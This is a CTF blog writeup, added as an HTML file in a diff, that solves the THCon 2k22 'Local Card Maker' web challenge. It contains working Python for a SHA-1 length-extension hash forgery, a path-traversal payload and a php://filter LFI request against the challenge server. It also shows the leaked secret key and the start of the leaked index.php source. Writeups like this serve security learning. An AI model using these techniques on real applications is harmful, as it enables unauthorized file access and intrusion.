@@ -1,0 +1,281 @@
+<!doctype html><html lang=en><head><meta charset=UTF-8><meta content="width=device-width,initial-scale=1.0" name=viewport><link href=https://guylewin.com/rss.xml rel=alternate title=RSS type=application/rss+xml><title>Guy Lewin's Blog | THCon 2k22 CTF - "Local Card Maker" Writeup</title><link as=style href=https://guylewin.com/css/style.css rel=preload><link crossorigin href=https://raw.githack.com/Speyll/suCSS/main/reset-min.css rel=stylesheet><link crossorigin href=https://raw.githack.com/Speyll/suCSS/main/suCSS-min.css rel=stylesheet><link href=https://guylewin.com/css/style.css rel=stylesheet><link href=https://guylewin.com/css/custom.css rel=stylesheet><link href=https://guylewin.com/favicon.ico rel=icon><script src="https://www.googletagmanager.com/gtag/js?id=G-YEJ89F03YG" async></script><script>window.dataLayer = window.dataLayer || [];
+            function gtag(){dataLayer.push(arguments);}
+            gtag('js', new Date());
+
+            gtag('config', 'G-YEJ89F03YG');</script><meta content="A detailed writeup of solving a web exploitation challenge involving PHP LFI, SHA-1 hash extension attacks, and file inclusion vulnerabilities to achieve remote code execution." name=description><meta content="A detailed writeup of solving a web exploitation challenge involving PHP LFI, SHA-1 hash extension attacks, and file inclusion vulnerabilities to achieve remote code execution." property=og:description><meta content="A detailed writeup of solving a web exploitation challenge involving PHP LFI, SHA-1 hash extension attacks, and file inclusion vulnerabilities to achieve remote code execution." name=twitter:description><meta content="ctf, exploit, lfi, php, rce, sha-1, web" name=keywords><meta content=Zola name=generator><meta content=English name=language><meta content="index, follow" name=robots><meta content="index, follow" name=googlebot><meta content=en_US property=og:locale><meta content="Guy Lewin's Blog" property=og:site_name><meta content='Guy Lewin&#39;s Blog | THCon 2k22 CTF - "Local Card Maker" Writeup' property=og:title><meta content=https://guylewin.com/blog/2022-04-17-thcon-2k22-ctf-local-card-maker-writeup/ property=og:url><meta content=article property=og:type><meta content=summary_large_image name=twitter:card><meta content='Guy Lewin&#39;s Blog | THCon 2k22 CTF - "Local Card Maker" Writeup' name=twitter:title><link href=https://guylewin.com/blog/2022-04-17-thcon-2k22-ctf-local-card-maker-writeup/ rel=canonical><meta content="Guy Lewin" name=author><meta content="Guy Lewin" property=og:author><meta content=2022-04-17T00:00:00Z property=article:published_time><meta content="Guy Lewin" property=article:author><meta content=Blog property=article:section><meta content=ctf property=article:tag><meta content=exploit property=article:tag><meta content=lfi property=article:tag><meta content=php property=article:tag><meta content=rce property=article:tag><meta content=sha-1 property=article:tag><meta content=web property=article:tag><script type=application/ld+json>
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "headline": "THCon 2k22 CTF - &quot;Local Card Maker&quot; Writeup",
+    
+    "author": {
+        "@type": "Person",
+        "name": "Guy Lewin"
+    },
+    
+    
+    "datePublished": "2022-04-17",
+    
+    "description": "A detailed writeup of solving a web exploitation challenge involving PHP LFI, SHA-1 hash extension attacks, and file inclusion vulnerabilities to achieve remote code execution.",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Guy Lewin&#x27;s Blog"
+    }
+}
+</script><body><nav id=nav-bar><div class=nav-social><a class=icon-link href=https://www.threads.com/@guylewin target=_blank><svg class=icon><use href=https://guylewin.com/icons.svg#threads></use></svg></a><a class=icon-link href=https://www.linkedin.com/in/guy-lewin-48b00712 target=_blank><svg class=icon><use href=https://guylewin.com/icons.svg#linkedin></use></svg></a><a class=icon-link href=https://github.com/GuyLewin target=_blank><svg class=icon><use href=https://guylewin.com/icons.svg#github></use></svg></a><a class=icon-link href=mailto:contact@guylewin.com target=_blank><svg class=icon><use href=https://guylewin.com/icons.svg#email></use></svg></a></div><div class=nav-menu><a href=/> /blog/ </a><a href=/about> /about/ </a></div><div class=nav-controls><div aria-label="Toggle theme" class=theme-toggle data-icon-base=https://guylewin.com/icons.svg data-icon-dark=#darkMode data-icon-light=#lightMode data-sound-src=https://guylewin.com/click.ogg id=theme-toggle role=button tabindex=0><svg class=icon><use id=theme-icon></use></svg></div></div></nav><main><article class=post><header class=post-header><time datetime=2022-04-17>Published on: <span class=accent-data>2022-04-17</span> </time><address rel=author>By <span class=accent-data>Guy Lewin</span></address><h1>THCon 2k22 CTF - "Local Card Maker" Writeup</h1></header><div class=post-content><p>I participated in <a href=https://ctf.thcon.party/ rel=noopener target=_blank>THCon 2k22 CTF</a> and amongst the incredible "web" challenges - my favorite was "Local Card Maker" (made by <code>jrjgjk</code>). In this post I'll describe the challenge and my step-by-step solution.<h2 id=the-challenge>The Challenge</h2><p><img alt="Description in the CTF portal" src=/images/posts/thcon-2k22-ctf-local-card-maker-writeup/1.png><p>Right off the bat we can tell there’s going to be some SHA-1 (<em>"secure hash algorithm 1"</em>) with a 23 character "secret key". The attached ZIP file contained only the following <code>scan.txt</code> file:<pre style=color:#fdf4c1aa;background-color:#282828><code><span>PAGE	|	HTTP_STATUS
+</span><span>
+</span><span>/index.php   ==> 200
+</span><span>/phpinfo.php ==> 200
+</span><span>/change_profile.php ==> 200
+</span><span>/view_profile.php ==> 200
+</span></code></pre><p>The goal is to read the content of <code>/flag.txt</code>.<h2 id=exploring-the-site>Exploring the Site</h2><p>The site has 2 interesting pages I could find:<p><img alt=View src=/images/posts/thcon-2k22-ctf-local-card-maker-writeup/2.png> <img alt=Edit src=/images/posts/thcon-2k22-ctf-local-card-maker-writeup/3.png><p>The edit page sets a cookie (<code>user_data</code>) with the PHP-serialized <code>User</code> object set in the form (along with another cookie - <code>user_hash</code> to sign that data), and the view page displays that information if the hash is valid. I tried modifying <code>user_data</code> in multiple ways but kept getting hash validation errors. I decided to put that aside and try a different direction.<p>The URLs of these pages - <code>http://challenges1.thcon.party:2001/index.php?page=Y2hhbmdlX3Byb2ZpbGU=&pHash=0171caa8e7a1fe56361fdce865e6e174b3b892f9</code> and <code>http://challenges1.thcon.party:2001/index.php?page=dmlld19wcm9maWxl&pHash=7b6f8b016f25da478b9f28f878aa3be8cced66fd</code> - both seem to go through <code>index.php</code> for rendering. The <code>page</code> parameter is base64-encoded "change_profile" and "view_profile" which matches the files in <code>scan.txt</code>!<p>When I tried to access <code>/phpinfo.php</code>, <code>/change_profile.php</code> or <code>/view_profile.php</code> directly I received an error ("Direct access to this page is disable.").<p>Theoretically - we can access <code>phpinfo.php</code> if we could put that value (Base64-encoded) in the <code>page</code> query parameter - but without finding the proper hash the validation will keep failing.<h2 id=sha-1-exploitation>SHA-1 Exploitation</h2><p>A quick Google search led me to <a href=https://journal.batard.info/post/2011/03/04/exploiting-sha-1-signed-messages rel=noopener target=_blank>this article</a> which seemed like the perfect solution - if I have data and SHA-1 hash on it with a salt prefix (of known length) - I can append data to it and calculate a valid hash, without knowing the salt! To understand this section better - I recommend reading the article before proceeding.<p>I relied heavily on <a href=https://github.com/nicolasff/pysha1 rel=noopener target=_blank>the code from the article <code>nicolasff</code> posted on GitHub</a> to create a script to fetch <code>phpinfo.php</code>:<pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span style=color:#fa5c4b>import </span><span>struct
+</span><span style=color:#fa5c4b>import </span><span>base64
+</span><span style=color:#fa5c4b>import </span><span>urllib.parse
+</span><span style=color:#fa5c4b>import </span><span>requests
+</span><span>
+</span><span style=color:#928374;font-style:italic># The code below is based on https://github.com/nicolasff/pysha1 (adapted to Python3) until line 87:
+</span><span>
+</span><span>top </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0xffffffff
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>rotl</span><span>(</span><span style=color:#fdf4c1>i</span><span>, </span><span style=color:#fdf4c1>n</span><span>):
+</span><span>    lmask </span><span style=color:#fe8019>= </span><span>top </span><span style=color:#fe8019>&lt;&lt; </span><span>(</span><span style=color:#d3869b>32</span><span style=color:#fe8019>-</span><span>n)
+</span><span>    rmask </span><span style=color:#fe8019>= </span><span>top </span><span style=color:#fe8019>>> </span><span>n
+</span><span>    l </span><span style=color:#fe8019>= </span><span>i </span><span style=color:#fe8019>& </span><span>lmask
+</span><span>    r </span><span style=color:#fe8019>= </span><span>i </span><span style=color:#fe8019>& </span><span>rmask
+</span><span>    newl </span><span style=color:#fe8019>= </span><span>r </span><span style=color:#fe8019>&lt;&lt; </span><span>n
+</span><span>    newr </span><span style=color:#fe8019>= </span><span>l </span><span style=color:#fe8019>>> </span><span>(</span><span style=color:#d3869b>32</span><span style=color:#fe8019>-</span><span>n)
+</span><span>    </span><span style=color:#fa5c4b>return </span><span>newl </span><span style=color:#fe8019>+ </span><span>newr
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>add</span><span>(</span><span style=color:#fdf4c1>l</span><span>):
+</span><span>    ret </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0
+</span><span>    </span><span style=color:#fa5c4b>for </span><span>e </span><span style=color:#fa5c4b>in </span><span>l:
+</span><span>        ret </span><span style=color:#fe8019>= </span><span>(ret </span><span style=color:#fe8019>+ </span><span>e) </span><span style=color:#fe8019>& </span><span>top
+</span><span>    </span><span style=color:#fa5c4b>return </span><span>ret
+</span><span>
+</span><span style=color:#fabd2f>xrange </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>range
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>sha1_impl</span><span>(</span><span style=color:#fdf4c1>msg</span><span>, </span><span style=color:#fdf4c1>h0</span><span>, </span><span style=color:#fdf4c1>h1</span><span>, </span><span style=color:#fdf4c1>h2</span><span>, </span><span style=color:#fdf4c1>h3</span><span>, </span><span style=color:#fdf4c1>h4</span><span>):
+</span><span>    </span><span style=color:#fa5c4b>for </span><span>j </span><span style=color:#fa5c4b>in </span><span style=color:#fabd2f>xrange</span><span style=color:#fdf4c1>(</span><span style=color:#fabd2f>int</span><span style=color:#fdf4c1>(</span><span style=color:#fabd2f>len</span><span style=color:#fdf4c1>(msg) </span><span style=color:#fe8019>/ </span><span style=color:#d3869b>64</span><span style=color:#fdf4c1>))</span><span>:
+</span><span>        chunk </span><span style=color:#fe8019>= </span><span>msg[j </span><span style=color:#fe8019>* </span><span style=color:#d3869b>64</span><span>: (j</span><span style=color:#fe8019>+</span><span style=color:#d3869b>1</span><span>) </span><span style=color:#fe8019>* </span><span style=color:#d3869b>64</span><span>]
+</span><span>
+</span><span>        w </span><span style=color:#fe8019>= </span><span>{}
+</span><span>        </span><span style=color:#fa5c4b>for </span><span>i </span><span style=color:#fa5c4b>in </span><span style=color:#fabd2f>xrange</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>16</span><span style=color:#fdf4c1>)</span><span>:
+</span><span>            word </span><span style=color:#fe8019>= </span><span>chunk[i</span><span style=color:#fe8019>*</span><span style=color:#d3869b>4</span><span>: (i</span><span style=color:#fe8019>+</span><span style=color:#d3869b>1</span><span>)</span><span style=color:#fe8019>*</span><span style=color:#d3869b>4</span><span>]
+</span><span>            (w[i],) </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>struct.unpack(</span><span style=color:#b8bb26>">i"</span><span style=color:#fdf4c1>, word)
+</span><span>
+</span><span>        </span><span style=color:#fa5c4b>for </span><span>i </span><span style=color:#fa5c4b>in </span><span style=color:#fabd2f>range</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>16</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>80</span><span style=color:#fdf4c1>)</span><span>:
+</span><span>            w[i] </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>rotl((w[i</span><span style=color:#fe8019>-</span><span style=color:#d3869b>3</span><span style=color:#fdf4c1>] </span><span style=color:#fe8019>^ </span><span style=color:#fdf4c1>w[i</span><span style=color:#fe8019>-</span><span style=color:#d3869b>8</span><span style=color:#fdf4c1>] </span><span style=color:#fe8019>^ </span><span style=color:#fdf4c1>w[i</span><span style=color:#fe8019>-</span><span style=color:#d3869b>14</span><span style=color:#fdf4c1>] </span><span style=color:#fe8019>^ </span><span style=color:#fdf4c1>w[i</span><span style=color:#fe8019>-</span><span style=color:#d3869b>16</span><span style=color:#fdf4c1>]) </span><span style=color:#fe8019>& </span><span style=color:#fdf4c1>top, </span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>        a </span><span style=color:#fe8019>= </span><span>h0
+</span><span>        b </span><span style=color:#fe8019>= </span><span>h1
+</span><span>        c </span><span style=color:#fe8019>= </span><span>h2
+</span><span>        d </span><span style=color:#fe8019>= </span><span>h3
+</span><span>        e </span><span style=color:#fe8019>= </span><span>h4
+</span><span>
+</span><span>        </span><span style=color:#fa5c4b>for </span><span>i </span><span style=color:#fa5c4b>in </span><span style=color:#fabd2f>range</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>80</span><span style=color:#fdf4c1>)</span><span>:
+</span><span>            </span><span style=color:#fa5c4b>if </span><span style=color:#d3869b>0 </span><span style=color:#fe8019>&lt;= </span><span>i </span><span style=color:#fe8019>&lt;= </span><span style=color:#d3869b>19</span><span>:
+</span><span>                f </span><span style=color:#fe8019>= </span><span>(b </span><span style=color:#fe8019>& </span><span>c) </span><span style=color:#fe8019>| </span><span>((</span><span style=color:#fe8019>~ </span><span>b) </span><span style=color:#fe8019>& </span><span>d)
+</span><span>                k </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0x5A827999
+</span><span>            </span><span style=color:#fa5c4b>elif </span><span style=color:#d3869b>20 </span><span style=color:#fe8019>&lt;= </span><span>i </span><span style=color:#fe8019>&lt;= </span><span style=color:#d3869b>39</span><span>:
+</span><span>                f </span><span style=color:#fe8019>= </span><span>b </span><span style=color:#fe8019>^ </span><span>c </span><span style=color:#fe8019>^ </span><span>d
+</span><span>                k </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0x6ED9EBA1
+</span><span>            </span><span style=color:#fa5c4b>elif </span><span style=color:#d3869b>40 </span><span style=color:#fe8019>&lt;= </span><span>i </span><span style=color:#fe8019>&lt;= </span><span style=color:#d3869b>59</span><span>:
+</span><span>                f </span><span style=color:#fe8019>= </span><span>(b </span><span style=color:#fe8019>& </span><span>c) </span><span style=color:#fe8019>| </span><span>(b </span><span style=color:#fe8019>& </span><span>d) </span><span style=color:#fe8019>| </span><span>(c </span><span style=color:#fe8019>& </span><span>d)
+</span><span>                k </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0x8F1BBCDC
+</span><span>            </span><span style=color:#fa5c4b>elif </span><span style=color:#d3869b>60 </span><span style=color:#fe8019>&lt;= </span><span>i </span><span style=color:#fe8019>&lt;= </span><span style=color:#d3869b>79</span><span>:
+</span><span>                f </span><span style=color:#fe8019>= </span><span>b </span><span style=color:#fe8019>^ </span><span>c </span><span style=color:#fe8019>^ </span><span>d
+</span><span>                k </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0xCA62C1D6
+</span><span>
+</span><span>            temp </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>add([rotl(a, </span><span style=color:#d3869b>5</span><span style=color:#fdf4c1>), f, e, k, w[i]])
+</span><span>            e </span><span style=color:#fe8019>= </span><span>d
+</span><span>            d </span><span style=color:#fe8019>= </span><span>c
+</span><span>            c </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>rotl(b, </span><span style=color:#d3869b>30</span><span style=color:#fdf4c1>)
+</span><span>            b </span><span style=color:#fe8019>= </span><span>a
+</span><span>            a </span><span style=color:#fe8019>= </span><span>temp
+</span><span>
+</span><span>        h0 </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>add([h0, a])
+</span><span>        h1 </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>add([h1, b])
+</span><span>        h2 </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>add([h2, c])
+</span><span>        h3 </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>add([h3, d])
+</span><span>        h4 </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>add([h4, e])
+</span><span>
+</span><span>    </span><span style=color:#fa5c4b>return </span><span>(h0, h1, h2, h3, h4)
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>pad</span><span>(</span><span style=color:#fdf4c1>msg</span><span>, </span><span style=color:#fdf4c1>sz </span><span style=color:#fe8019>= </span><span style=color:#d3869b>None</span><span>):
+</span><span>    </span><span style=color:#fa5c4b>if </span><span>sz </span><span style=color:#fe8019>== </span><span style=color:#d3869b>None</span><span>:
+</span><span>        sz </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>len</span><span style=color:#fdf4c1>(msg)
+</span><span>    bits </span><span style=color:#fe8019>= </span><span>sz </span><span style=color:#fe8019>* </span><span style=color:#d3869b>8
+</span><span>    padding </span><span style=color:#fe8019>= </span><span style=color:#d3869b>512 </span><span style=color:#fe8019>- </span><span>((bits </span><span style=color:#fe8019>+ </span><span style=color:#d3869b>8</span><span>) </span><span style=color:#fe8019>% </span><span style=color:#d3869b>512</span><span>) </span><span style=color:#fe8019>- </span><span style=color:#d3869b>64
+</span><span>
+</span><span>    msg </span><span style=color:#fe8019>+= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"\x80"  </span><span style=color:#928374;font-style:italic># append bit "1", and a few zeros.
+</span><span>    </span><span style=color:#fa5c4b>return </span><span>msg </span><span style=color:#fe8019>+ </span><span style=color:#fabd2f>int</span><span style=color:#fdf4c1>(padding </span><span style=color:#fe8019>/ </span><span style=color:#d3869b>8</span><span style=color:#fdf4c1>) </span><span style=color:#fe8019>* </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"\x00" </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>struct.pack(</span><span style=color:#b8bb26>">q"</span><span style=color:#fdf4c1>, bits)  </span><span style=color:#928374;font-style:italic># don't count the \x80 here, hence the -8.
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>sha1</span><span>(</span><span style=color:#fdf4c1>msg</span><span>):
+</span><span>    </span><span style=color:#928374;font-style:italic># These are the constants in a standard SHA-1
+</span><span>    </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>sha1_impl(pad(msg), </span><span style=color:#d3869b>0x67452301 </span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>0xefcdab89 </span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>0x98badcfe </span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>0x10325476 </span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>0xc3d2e1f0</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=color:#928374;font-style:italic># "Local Card Maker"-specific implementation starts here:
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>sha1_bytes_to_str</span><span>(</span><span style=color:#fdf4c1>result</span><span>):
+</span><span>    </span><span style=color:#fa5c4b>return </span><span style=color:#b8bb26>''</span><span style=color:#fdf4c1>.join([</span><span style=color:#fabd2f>hex</span><span style=color:#fdf4c1>(x)[</span><span style=color:#d3869b>2</span><span style=color:#fdf4c1>:].zfill(</span><span style=color:#d3869b>2</span><span style=color:#fdf4c1>) </span><span style=color:#fa5c4b>for </span><span style=color:#fdf4c1>x </span><span style=color:#fa5c4b>in </span><span style=color:#fdf4c1>result])
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>get_h_values</span><span>(</span><span style=color:#fdf4c1>hash_string</span><span>):
+</span><span>    </span><span style=color:#928374;font-style:italic># Divide hash_string to 5 ints, 4 bytes each
+</span><span>    </span><span style=color:#fa5c4b>return </span><span>[</span><span style=color:#fabd2f>int</span><span style=color:#fdf4c1>(hash_string[i</span><span style=color:#fe8019>*</span><span style=color:#d3869b>8</span><span style=color:#fdf4c1>:(i</span><span style=color:#fe8019>+</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>)</span><span style=color:#fe8019>*</span><span style=color:#d3869b>8</span><span style=color:#fdf4c1>], </span><span style=color:#d3869b>16</span><span style=color:#fdf4c1>) </span><span style=color:#fa5c4b>for </span><span>i </span><span style=color:#fa5c4b>in </span><span style=color:#fabd2f>range</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>5</span><span style=color:#fdf4c1>)</span><span>]
+</span><span>
+</span><span style=color:#928374;font-style:italic># "view_profile" taken from site ("page" query parameter)
+</span><span>block_1_buf </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"dmlld19wcm9maWxl"
+</span><span style=color:#928374;font-style:italic># Hash taken from site ("pHash" query parameter)
+</span><span>block_1_hash </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"7b6f8b016f25da478b9f28f878aa3be8cced66fd"
+</span><span>block_1_h_values </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>get_h_values(block_1_hash)
+</span><span style=color:#928374;font-style:italic># taken from description of challenge
+</span><span>salt_len </span><span style=color:#fe8019>= </span><span style=color:#d3869b>23
+</span><span>
+</span><span style=color:#928374;font-style:italic># "aaa" is padding, since the previous SHA-1 block contains the length at the end which is parsed by PHP as Base64 data.
+</span><span style=color:#928374;font-style:italic># I align to 4 bytes in order for the appended path to be parsed correctly.
+</span><span>block_2_buf </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"aaa" </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>base64.encodebytes(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"/.././././././././phpinfo"</span><span style=color:#fdf4c1>).replace(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"\n"</span><span style=color:#fdf4c1>, </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>""</span><span style=color:#fdf4c1>)
+</span><span style=color:#928374;font-style:italic># Pad this second block, use a custom size with additional 64 bytes to account for the first block (which is always padded to 64)
+</span><span>block_2_buf_padded </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>pad(block_2_buf, </span><span style=color:#fabd2f>len</span><span style=color:#fdf4c1>(block_2_buf) </span><span style=color:#fe8019>+ </span><span style=color:#d3869b>64</span><span style=color:#fdf4c1>)
+</span><span>joined_buf_hash </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>sha1_bytes_to_str(sha1_impl(block_2_buf_padded, </span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>block_1_h_values))
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(joined_buf_hash)
+</span><span style=color:#928374;font-style:italic># Add 23 "A"s to simulate the SHA-1 block creation with the salt, but remove the salt since it'll be added by the server.
+</span><span>joined_buf </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>pad((</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"A" </span><span style=color:#fe8019>* </span><span style=color:#fdf4c1>salt_len) </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>block_1_buf)</span><span>[salt_len:] </span><span style=color:#fe8019>+ </span><span>block_2_buf
+</span><span>encoded_joined_buf </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>urllib.parse.quote_plus(joined_buf)
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(encoded_joined_buf)
+</span><span>
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(requests.get(</span><span style=color:#b8bb26>"http://challenges1.thcon.party:2001/index.php?page=</span><span style=color:#fdf4c1>%s</span><span style=color:#b8bb26>&pHash=</span><span style=color:#fdf4c1>%s</span><span style=color:#b8bb26>" </span><span style=color:#fe8019>% </span><span style=color:#fdf4c1>(encoded_joined_buf, joined_buf_hash)).content)
+</span></code></pre><p>In the code above we use the "view_profile" page (encoded as <code>dmlld19wcm9maWxl</code> in Base64) along with the salted hash (<code>7b6f8b016f25da478b9f28f878aa3be8cced66fd</code>) from the site URL. We pad that to a SHA-1 block (64 bytes including the salt, first byte after data is 0x80 and last 2 bytes are length) and add a 2nd block: <code>aaa + base64("/.././././././././phpinfo")</code>.<p>We add 3 bytes (<code>"aaa"</code>) because the last byte of the previous SHA-1 block (as you can see below - 0x38 in yellow) is identified by PHP as a Base64 data byte. Aligning that to 4 bytes makes the following Base64-encoded string correctly readable (since Base64 is read aligned to 4 bytes).<p>The result <code>joined_buf</code> which we were able to sign (before URL encoding) is:<p><img alt src=/images/posts/thcon-2k22-ctf-local-card-maker-writeup/4.png><p>The first part (green) is the original Base64-encoded string (containing "view_profile"). The red <code>0x80</code> is the end-of-string marker added in SHA-1. Afterwards, the white <code>0x00</code> bytes are padding to complete the first chunk to 64 bytes (taking into account that 23 bytes were also used for salt and 2 bytes are used for length). The yellow <code>0x01 0x38</code> is chunk length in bits. It equals 0x138 = 312 bits = 39 bytes which is calculated by: <code>len("dmlld19wcm9maWxl") + key_length = 16 + 23 = 39</code>. The next 3 blue-colored <code>0x61</code> bytes are the padding I mentioned previously to align our Base64 string for PHP. The rest of the purple bytes are the Base64 payload.<p>When PHP receives this payload with a valid hash - it parses the Base64-encoded path as: <code>view_profile&lt;unprintable characters>/.././././././././phpinfo</code> - which will be resolved into <code>phpinfo</code> and appended by the app logic with <code>.php</code>. Now we got to read what’s in <code>phpinfo.php</code>!<h2 id=phpinfo>phpinfo</h2><p>If you’re unfamiliar with <a href=https://www.php.net/manual/en/function.phpinfo.php rel=noopener target=_blank><code>phpinfo()</code></a> - it’s a built-in function that prints useful information about PHP and the environment it’s running on. Here’s how it looks like when running from our exploited URL (<code>phpinfo.php</code> simply calls <code>phpinfo()</code>):<p><img alt src=/images/posts/thcon-2k22-ctf-local-card-maker-writeup/5.png> Within this page I found a good lead - the key used as the SHA-1 salt! The key was shown here because it’s defined as a PHP variable:<p><img alt src=/images/posts/thcon-2k22-ctf-local-card-maker-writeup/6.png> But this key isn’t enough to retrieve the flag from /flag.txt - we can’t load a .txt file since the <code>index.php</code> loader code appends <code>.php</code> to every Base64 payload we give it.<h2 id=bonus-leaking-index-php-file-contents>Bonus - Leaking index.php File Contents</h2><p>I wanted to make sure I understand how <code>index.php</code> works internally, so equipped with the secret key I leaked the content of index.php:<pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span style=color:#fa5c4b>import </span><span>base64
+</span><span style=color:#fa5c4b>import </span><span>hashlib
+</span><span style=color:#fa5c4b>import </span><span>requests
+</span><span>
+</span><span>php_file </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"index"
+</span><span>path </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"php://filter/convert.base64-encode/resource=</span><span style=color:#fdf4c1>%s</span><span style=color:#b8bb26>" </span><span style=color:#fe8019>% </span><span>(php_file,)
+</span><span>key_salt </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"Thcon_SuP3r_S3cr4t_K3y!"
+</span><span>buf </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>base64.encodebytes(path).replace(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"\n"</span><span style=color:#fdf4c1>, </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>""</span><span style=color:#fdf4c1>)
+</span><span>buf_hash </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>hashlib.sha1(key_salt </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>buf).hexdigest()
+</span><span>buf </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>buf.decode()
+</span><span>
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(requests.get(</span><span style=color:#b8bb26>"http://challenges1.thcon.party:2001/index.php?page=</span><span style=color:#fdf4c1>%s</span><span style=color:#b8bb26>&pHash=</span><span style=color:#fdf4c1>%s</span><span style=color:#b8bb26>" </span><span style=color:#fe8019>% </span><span style=color:#fdf4c1>(buf, buf_hash)).content)
+</span></code></pre><p>The result is Base64-encoded <code>index.php</code>. Here it is after decoding, to better understand how this challenge works:<pre class=language-php data-lang=php style=color:#fdf4c1aa;background-color:#282828><code class=language-php data-lang=php><span>&lt;?php
+</span><span style=color:#fabd2f>session_start</span><span style=color:#fdf4c1>();
+</span><span style=color:#fa5c4b>require</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"crypto.php"</span><span style=color:#fdf4c1>);
+</span><span style=color:#fdf4c1>$safe_handler </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>new </span><span style=color:#8ec07c>IntegrityHandler</span><span style=color:#fdf4c1>($_SERVER[</span><span style=color:#b8bb26>'SECRET_KEY'</span><span style=color:#fdf4c1>], </span><span style=color:#b8bb26>'sha1'</span><span style=color:#fdf4c1>);
+</span><span style=color:#fabd2f>define</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"LOCAL_ACCESS"</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>);
+</span><span style=color:#fdf4c1>
+</span><span style=color:#fdf4c1>
+</span><span style=color:#fa5c4b>function </span><span style=color:#8ec07c>createHeaders</span><span style=color:#fdf4c1>($pArray, $handler){
+</span><span style=color:#fdf4c1>	</span><span style=color:#fabd2f>echo </span><span style=color:#b8bb26>'&lt;a href="/">&lt;li>Home&lt;/li>&lt;/a>'</span><span style=color:#fdf4c1>;
+</span><span style=color:#fdf4c1>	</span><span style=color:#fa5c4b>foreach</span><span style=color:#fdf4c1>($pArray </span><span style=color:#fe8019>as </span><span style=color:#fdf4c1>$p </span><span style=color:#fe8019>=> </span><span style=color:#fdf4c1>$v){
